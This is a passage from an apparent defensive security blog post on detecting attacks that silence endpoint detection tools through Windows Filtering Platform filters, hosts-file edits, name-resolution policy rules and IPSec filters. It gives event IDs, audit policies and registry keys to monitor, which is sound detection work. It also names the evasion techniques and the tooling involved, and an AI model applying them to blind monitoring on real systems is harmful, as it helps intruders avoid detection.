<figure class="wp-block-table is-style-regular"><table class="has-fixed-layout"><thead><tr><th class="has-text-align-center" data-align="center">WFP API Call</th><th class="has-text-align-center" data-align="center">Event ID</th><th class="has-text-align-center" data-align="center">Data Source</th></tr></thead><tbody><tr><td class="has-text-align-center" data-align="center">FwpmFilterAdd0</td><td class="has-text-align-center" data-align="center">5444</td><td class="has-text-align-center" data-align="center">Windows Events</td></tr><tr><td class="has-text-align-center" data-align="center">FwpmFilterAdd0</td><td class="has-text-align-center" data-align="center">5157</td><td class="has-text-align-center" data-align="center">Windows Events</td></tr><tr><td class="has-text-align-center" data-align="center">FwpmProviderAdd0</td><td class="has-text-align-center" data-align="center">5441</td><td class="has-text-align-center" data-align="center">Windows Events</td></tr><tr><td class="has-text-align-center" data-align="center">FwpmFilterEnum0</td><td class="has-text-align-center" data-align="center"></td><td class="has-text-align-center" data-align="center">Windows Events</td></tr><tr><td class="has-text-align-center" data-align="center">FwpmFilterDeletebyId0</td><td class="has-text-align-center" data-align="center">5445</td><td class="has-text-align-center" data-align="center">Windows Events</td></tr><tr><td class="has-text-align-center" data-align="center">FwpmEngineOpen0</td><td class="has-text-align-center" data-align="center"></td><td class="has-text-align-center" data-align="center">Windows Events</td></tr></tbody></table></figure>



<p class="has-text-align-justify wp-block-paragraph">The procedure requires identification of the EDR processes in order to apply blocking filters. A set of Windows API calls is used to take a snapshot of the EDR processes, perform a search for known EDR processes and retrieve the full image path of the matched processes. SOC teams should validate with their Endpoint Detection and Response provider if their deployment performs hooking on these API’s. The table below summarize the API’s used by the proof of concept EDR Silencer.</p>



<figure class="wp-block-table"><table class="has-fixed-layout"><thead><tr><th class="has-text-align-center" data-align="center">API</th><th>Purpose</th></tr></thead><tbody><tr><td class="has-text-align-center" data-align="center">CreateToolhelp32Snapshot</td><td>Take a snapshot of system processes</td></tr><tr><td class="has-text-align-center" data-align="center">Process32First</td><td>Search for known EDR process names</td></tr><tr><td class="has-text-align-center" data-align="center">Process32Next</td><td>Search for known EDR process names</td></tr><tr><td class="has-text-align-center" data-align="center">QueryFullProcessImageName</td><td>Retrieves full image path of the EDR process</td></tr><tr><td class="has-text-align-center" data-align="center">OpenProcess</td><td>Open handle to the specified process</td></tr></tbody></table></figure>



<p class="has-text-align-justify wp-block-paragraph">Endpoint Detection and Response technologies might have capabilities to detect EDR Silencing, though the effectiveness might vary per vendor. SOC teams should consider a proactive approach by developing multi-layered defences across their network. It is important to note that Active Directory doesn’t have enabled by default group policies to capture threats that abuse the Windows Filtering Platform. Organisations can enhance visibility by enabling auditing on the following policies:</p>



<pre class="wp-block-code"><code>Computer Configuration &gt; Windows Settings &gt; Security Settings &gt; Advanced Audit Policy Configuration &gt; Audit Policies &gt; Policy Change &gt; Audit Filtering Platform Policy Change
Computer Configuration &gt; Windows Settings &gt; Security Settings &gt; Advanced Audit Policy Configuration &gt; Audit Policies &gt; Object Access &gt; Audit Filtering Platform Connection
Computer Configuration &gt; Windows Settings &gt; Security Settings &gt; Advanced Audit Policy Configuration &gt; Audit Policies &gt; Object Access &gt; Audit Filtering Platform Packet Drop</code></pre>



<figure class="wp-block-image aligncenter size-large"><img data-attachment-id="1705" data-permalink="https://ipurple.team/2026/01/12/edr-silencing/edr-silencing-windows-filtering-platform-policy-change/" data-orig-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-windows-filtering-platform-policy-change.png" data-orig-size="1171,772" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="EDR Silencing &amp;#8211; Windows Filtering Platform Policy Change" data-image-description="" data-image-caption="" data-medium-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-windows-filtering-platform-policy-change.png?w=300" data-large-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-windows-filtering-platform-policy-change.png?w=1024" loading="lazy" width="1024" height="675" src="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-windows-filtering-platform-policy-change.png?w=1024" alt="" class="wp-image-1705"><figcaption class="wp-element-caption"><em>Audit Filtering Platform Policy Change</em></figcaption></figure>



<figure class="wp-block-image aligncenter size-large"><img data-attachment-id="1707" data-permalink="https://ipurple.team/2026/01/12/edr-silencing/edr-silencing-audit-filtering-platform/" data-orig-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-audit-filtering-platform.png" data-orig-size="1176,774" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="EDR Silencing &amp;#8211; Audit Filtering Platform" data-image-description="" data-image-caption="" data-medium-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-audit-filtering-platform.png?w=300" data-large-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-audit-filtering-platform.png?w=1024" loading="lazy" width="1024" height="673" src="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-audit-filtering-platform.png?w=1024" alt="" class="wp-image-1707"><figcaption class="wp-element-caption"><em>Audit Filtering Platform Connection &amp; Packet Drop</em></figcaption></figure>



<p class="has-text-align-justify wp-block-paragraph">It needs to be highlighted that enabling these policies will cause a significant increase in windows event logs. If data storage is not a concern, detection engineering efforts should focus on processes attempting to add filters (5444 &amp; 5147).</p>



<figure class="wp-block-image aligncenter size-large"><img data-attachment-id="1709" data-permalink="https://ipurple.team/2026/01/12/edr-silencing/edr-silencing-windows-filtering-platform-logs/" data-orig-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-windows-filtering-platform-logs.png" data-orig-size="1114,906" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="EDR Silencing &amp;#8211; Windows Filtering Platform Logs" data-image-description="" data-image-caption="" data-medium-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-windows-filtering-platform-logs.png?w=300" data-large-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-windows-filtering-platform-logs.png?w=1024" loading="lazy" width="1024" height="832" src="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-windows-filtering-platform-logs.png?w=1024" alt="" class="wp-image-1709"><figcaption class="wp-element-caption"><em>Windows Filtering Platform – Multiple Events</em></figcaption></figure>



<h4 class="wp-block-heading">Registry</h4>



<p class="has-text-align-justify wp-block-paragraph">Windows Filtering Platform filters are stored in the registry. SOC teams should investigate the GUID values to identify rules associated with the EDR process during incident response. Monitoring the key that stores the filter is recommended to identify new additions.</p>



<pre class="wp-block-code"><code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\BFE\Parameters\Policy\Persistent\Filter</code></pre>



<figure class="wp-block-image aligncenter size-large"><img data-attachment-id="1714" data-permalink="https://ipurple.team/2026/01/12/edr-silencing/edr-silencing-filters-registry-key/" data-orig-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-filters-registry-key.png" data-orig-size="1362,916" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="EDR Silencing &amp;#8211; Filters Registry Key" data-image-description="" data-image-caption="" data-medium-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-filters-registry-key.png?w=300" data-large-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-filters-registry-key.png?w=1024" loading="lazy" width="1024" height="688" src="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-filters-registry-key.png?w=1024" alt="" class="wp-image-1714"><figcaption class="wp-element-caption"><em>EDR Silencing – Registry Key</em></figcaption></figure>



<figure class="wp-block-image aligncenter size-large"><img data-attachment-id="1715" data-permalink="https://ipurple.team/2026/01/12/edr-silencing/edr-silencing-audit-filters-registry-key/" data-orig-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-audit-filters-registry-key.png" data-orig-size="1176,856" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="EDR Silencing &amp;#8211; Audit Filters Registry Key" data-image-description="" data-image-caption="" data-medium-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-audit-filters-registry-key.png?w=300" data-large-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-audit-filters-registry-key.png?w=1024" loading="lazy" width="1024" height="745" src="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-audit-filters-registry-key.png?w=1024" alt="" class="wp-image-1715"><figcaption class="wp-element-caption"><em>Audit Filters Registry Key</em></figcaption></figure>



<figure class="wp-block-image aligncenter size-large"><img data-attachment-id="1717" data-permalink="https://ipurple.team/2026/01/12/edr-silencing/edr-silencing-windows-filtering-platform-edrnoisemaker/" data-orig-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-windows-filtering-platform-edrnoisemaker.png" data-orig-size="933,465" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="EDR Silencing &amp;#8211; Windows Filtering Platform EDRNoiseMaker" data-image-description="" data-image-caption="" data-medium-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-windows-filtering-platform-edrnoisemaker.png?w=300" data-large-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-windows-filtering-platform-edrnoisemaker.png?w=933" loading="lazy" width="933" height="465" src="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-windows-filtering-platform-edrnoisemaker.png?w=933" alt="" class="wp-image-1717"><figcaption class="wp-element-caption"><em>EDR Silencer &amp; EDR Noise Maker</em></figcaption></figure>



<p class="has-text-align-justify wp-block-paragraph">Filters that have been added in the Windows Filtering Platform, could be viewed by the <a href="https://github.com/zodiacon/WFPExplorer">Windows Filtering Platform Explorer</a> tool.</p>



<figure class="wp-block-image aligncenter size-large"><img data-attachment-id="1718" data-permalink="https://ipurple.team/2026/01/12/edr-silencing/edr-silencing-windows-filtering-platform-explorer/" data-orig-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-windows-filtering-platform-explorer.png" data-orig-size="1651,697" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="EDR Silencing &amp;#8211; Windows Filtering Platform Explorer" data-image-description="" data-image-caption="" data-medium-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-windows-filtering-platform-explorer.png?w=300" data-large-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-windows-filtering-platform-explorer.png?w=1024" loading="lazy" width="1024" height="432" src="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-windows-filtering-platform-explorer.png?w=1024" alt="" class="wp-image-1718"><figcaption class="wp-element-caption"><em>Windows Filtering Platform Explorer</em></figcaption></figure>



<h3 class="wp-block-heading">Hosts File</h3>



<p class="has-text-align-justify wp-block-paragraph">An alternative method to restrict EDR outbound communication is via modification of the <em>hosts</em> file. Identification of any changes in the <em>etc\hosts</em> file requires enabling auditing for <em>File System</em> and <em>Handle Manipulation</em>.</p>



<pre class="wp-block-code"><code>Computer Configuration &gt; Windows Settings &gt; Security Settings &gt; Advanced Audit Policy Configuration &gt; Audit Policies &gt; Object Access &gt; Audit File System
Computer Configuration &gt; Windows Settings &gt; Security Settings &gt; Advanced Audit Policy Configuration &gt; Audit Policies &gt; Object Access &gt; Audit Handle Manipulation</code></pre>



<figure class="wp-block-image aligncenter size-large"><img data-attachment-id="1722" data-permalink="https://ipurple.team/2026/01/12/edr-silencing/edr-silencing-audit-file-system-handle-manipulation/" data-orig-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-audit-file-system-handle-manipulation.png" data-orig-size="1167,774" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="EDR Silencing &amp;#8211; Audit File System &amp;amp; Handle Manipulation" data-image-description="" data-image-caption="" data-medium-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-audit-file-system-handle-manipulation.png?w=300" data-large-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-audit-file-system-handle-manipulation.png?w=1024" loading="lazy" width="1024" height="679" src="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-audit-file-system-handle-manipulation.png?w=1024" alt="" class="wp-image-1722"><figcaption class="wp-element-caption"><em>Audit File System &amp; Handle Manipulation</em></figcaption></figure>



<p class="has-text-align-justify wp-block-paragraph">The path of the <em>hosts</em> file should be also added under the <em>File System</em> container.</p>



<figure class="wp-block-image aligncenter size-large"><img data-attachment-id="1725" data-permalink="https://ipurple.team/2026/01/12/edr-silencing/edr-silencing-audit-hosts-file/" data-orig-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-audit-hosts-file.png" data-orig-size="1099,808" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="EDR Silencing &amp;#8211; Audit Hosts File" data-image-description="" data-image-caption="" data-medium-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-audit-hosts-file.png?w=300" data-large-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-audit-hosts-file.png?w=1024" loading="lazy" width="1024" height="752" src="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-audit-hosts-file.png?w=1024" alt="" class="wp-image-1725"><figcaption class="wp-element-caption"><em>Audit Hosts File</em></figcaption></figure>



<p class="has-text-align-justify wp-block-paragraph">It is recommended to apply auditing for Read/Write and Modify permissions.</p>



<figure class="wp-block-image aligncenter size-large"><img data-attachment-id="1727" data-permalink="https://ipurple.team/2026/01/12/edr-silencing/edr-silencing-audit-hosts-file-permissions/" data-orig-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-audit-hosts-file-permissions.png" data-orig-size="1372,726" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="EDR Silencing &amp;#8211; Audit Hosts File Permissions" data-image-description="" data-image-caption="" data-medium-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-audit-hosts-file-permissions.png?w=300" data-large-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-audit-hosts-file-permissions.png?w=1024" loading="lazy" width="1024" height="541" src="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-audit-hosts-file-permissions.png?w=1024" alt="" class="wp-image-1727"><figcaption class="wp-element-caption"><em>Audit Hosts File Permissions</em></figcaption></figure>



<p class="wp-block-paragraph">Any changes to the <em>hosts</em> file will be captured under Windows Event ID 4663.</p>



<figure class="wp-block-image aligncenter size-large"><img data-attachment-id="1729" data-permalink="https://ipurple.team/2026/01/12/edr-silencing/edr-silencing-hosts-file-event-id/" data-orig-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-hosts-file-event-id.png" data-orig-size="1228,853" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="EDR Silencing &amp;#8211; Hosts File Event ID" data-image-description="" data-image-caption="" data-medium-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-hosts-file-event-id.png?w=300" data-large-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-hosts-file-event-id.png?w=1024" loading="lazy" width="1024" height="711" src="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-hosts-file-event-id.png?w=1024" alt="" class="wp-image-1729"><figcaption class="wp-element-caption"><em>Hosts File Event ID</em></figcaption></figure>



<h3 class="wp-block-heading">Name Resolution Policy Table</h3>



<p class="has-text-align-justify wp-block-paragraph">The Name Resolution Policy Table could also be abused by threat actors to bind EDR domains to non-legitimate hosts. Records to the Name Resolution Policy Table could be added via a PowerShell cmdlet. Endpoint Detection and Response technologies can capture command line arguments so detection should be trivial. It should be noted that the entries to the Name Resolution Policy Table are stored in the following registry key:</p>



<pre class="wp-block-code"><code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters\DnsPolicyConfig</code></pre>



<p class="has-text-align-justify wp-block-paragraph">Therefore, it is recommended to apply monitoring for this key and subkeys via Group Policy.</p>



<figure class="wp-block-image aligncenter size-large"><img data-attachment-id="1732" data-permalink="https://ipurple.team/2026/01/12/edr-silencing/edr-silencing-audit-name-resolution-policy-table/" data-orig-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-audit-name-resolution-policy-table.png" data-orig-size="1171,834" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="EDR Silencing &amp;#8211; Audit Name Resolution Policy Table" data-image-description="" data-image-caption="" data-medium-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-audit-name-resolution-policy-table.png?w=300" data-large-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-audit-name-resolution-policy-table.png?w=1024" loading="lazy" width="1024" height="729" src="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-audit-name-resolution-policy-table.png?w=1024" alt="" class="wp-image-1732"><figcaption class="wp-element-caption"><em>Audit Name Resolution Policy Table</em></figcaption></figure>



<p class="has-text-align-justify wp-block-paragraph">Even though the <em>Add-DnsClientNrptRule</em> is not a WMI cmdlet, it interacts internally with WMI to query DNS client configuration and to check the state of the Name Resolution Policy Table. This will cause changes to the NRPT to appear from the process <em>WmiPrvSE</em>.exe. Modifications to the Name Resolution Policy Table will generate the following events:</p>



<figure class="wp-block-table"><table class="has-fixed-layout"><thead><tr><th class="has-text-align-center" data-align="center">Action</th><th class="has-text-align-center" data-align="center">Event ID</th></tr></thead><tbody><tr><td class="has-text-align-center" data-align="center">Handle Request</td><td class="has-text-align-center" data-align="center">4656</td></tr><tr><td class="has-text-align-center" data-align="center">Access Object</td><td class="has-text-align-center" data-align="center">4663</td></tr><tr><td class="has-text-align-center" data-align="center">Registry Key Modification</td><td class="has-text-align-center" data-align="center">4657</td></tr></tbody></table></figure>



<figure class="wp-block-image aligncenter size-large"><img data-attachment-id="1736" data-permalink="https://ipurple.team/2026/01/12/edr-silencing/edr-silencing-name-resolution-policy-table-event-id-4656/" data-orig-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-name-resolution-policy-table-event-id-4656.png" data-orig-size="1222,870" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="EDR Silencing &amp;#8211; Name Resolution Policy Table Event ID 4656" data-image-description="" data-image-caption="" data-medium-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-name-resolution-policy-table-event-id-4656.png?w=300" data-large-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-name-resolution-policy-table-event-id-4656.png?w=1024" loading="lazy" width="1024" height="729" src="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-name-resolution-policy-table-event-id-4656.png?w=1024" alt="" class="wp-image-1736"><figcaption class="wp-element-caption"><em>Name Resolution Policy Table – Event ID 4656</em></figcaption></figure>



<figure class="wp-block-image aligncenter size-large"><img data-attachment-id="1738" data-permalink="https://ipurple.team/2026/01/12/edr-silencing/edr-silencing-name-resolution-policy-table-event-id-4663/" data-orig-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-name-resolution-policy-table-event-id-4663.png" data-orig-size="1098,873" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="EDR Silencing &amp;#8211; Name Resolution Policy Table Event ID 4663" data-image-description="" data-image-caption="" data-medium-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-name-resolution-policy-table-event-id-4663.png?w=300" data-large-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-name-resolution-policy-table-event-id-4663.png?w=1024" loading="lazy" width="1024" height="814" src="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-name-resolution-policy-table-event-id-4663.png?w=1024" alt="" class="wp-image-1738"><figcaption class="wp-element-caption"><em>Name Resolution Policy Table – Event ID 4663</em></figcaption></figure>



<figure class="wp-block-image aligncenter size-large"><img data-attachment-id="1740" data-permalink="https://ipurple.team/2026/01/12/edr-silencing/edr-silencing-name-resolution-policy-table-event-id-4657/" data-orig-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-name-resolution-policy-table-event-id-4657.png" data-orig-size="1204,867" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="EDR Silencing &amp;#8211; Name Resolution Policy Table Event ID 4657" data-image-description="" data-image-caption="" data-medium-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-name-resolution-policy-table-event-id-4657.png?w=300" data-large-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-name-resolution-policy-table-event-id-4657.png?w=1024" loading="lazy" width="1024" height="737" src="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-name-resolution-policy-table-event-id-4657.png?w=1024" alt="" class="wp-image-1740"><figcaption class="wp-element-caption"><em>Name Resolution Policy Table – Event ID 4657</em></figcaption></figure>



<h3 class="wp-block-heading">IPSec Filter Rules</h3>



<p class="has-text-align-justify wp-block-paragraph">Adding IPSec Filter Rules to block EDR traffic can be performed from the command line by executing the <em>netsh</em> utility. IPSec policy configurations are stored in registry, therefore monitoring the associated key is required to detect arbitrary IPSec filters. SOC teams should enable monitoring for registry changes of the IPSec Policy registry key and subkeys.</p>



<figure class="wp-block-image aligncenter size-large"><img data-attachment-id="1743" data-permalink="https://ipurple.team/2026/01/12/edr-silencing/edr-silencing-audit-ipsec-filter-rules/" data-orig-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-audit-ipsec-filter-rules.png" data-orig-size="1168,828" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="EDR Silencing &amp;#8211; Audit IPSec Filter Rules" data-image-description="" data-image-caption="" data-medium-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-audit-ipsec-filter-rules.png?w=300" data-large-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-audit-ipsec-filter-rules.png?w=1024" loading="lazy" width="1024" height="725" src="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-audit-ipsec-filter-rules.png?w=1024" alt="" class="wp-image-1743"><figcaption class="wp-element-caption"><em>Audit IPSec Filter Rules</em></figcaption></figure>



<p class="has-text-align-justify wp-block-paragraph">Threat actors that could leverage IPSec filters to restrict EDR outbound traffic will generate a sequence of windows events. Attempts to access and modify the IPSec registry key from the <em>netsh</em> process should be considered arbitrary. Furthermore, the creation of new IPSec policies could be captured under Windows Event ID 5460 and 5471. It is recommended to correlate these actions with the registry key events that target IPSec policies. The table below associates the actions of this procedure with the windows event ID’s.</p>



